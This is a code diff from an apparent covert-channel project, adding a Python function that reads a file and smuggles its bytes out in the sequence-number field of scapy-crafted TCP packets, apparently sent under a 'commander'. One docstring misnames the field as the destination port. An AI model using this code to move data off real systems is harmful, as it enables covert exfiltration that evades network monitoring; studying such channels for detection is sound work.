@@ -1588,6 +1588,62 @@ def transfer_file_tcp_dst_port(client_sock: socket.socket,
         send(packet, verbose=0)
 
 
+def transfer_file_tcp_seq_num(client_sock: socket.socket,
+                               dest_ip: str,
+                               dest_port: int,
+                               src_port: int,
+                               file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    sequence number field.
+
+    @note Bit length
+        The destination port field for TCP headers is 32 bits (4 Bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 32):
+        binary_segment = binary_data[i:i + 32].ljust(32, '0')
+        sequence_num = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, seq=sequence_num)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
 def __get_protocol_header_function_map():
     return {  # A tuple of [Header, Field] => Function
         # a) IPv4 Handlers
@@ -1618,7 +1674,7 @@ def __get_protocol_header_function_map():
         # c) TCP Handlers
         ("TCP", "Source Port"): transfer_file_tcp_src_port,
         ("TCP", "Destination Port"): transfer_file_tcp_dst_port,
-        ("TCP", "Sequence Number"): "F()",
+        ("TCP", "Sequence Number"): transfer_file_tcp_seq_num,
         ("TCP", "Acknowledgement Number"): "F()",
         ("TCP", "Header Length"): "F()",
         ("TCP", "Reserved"): "F()",
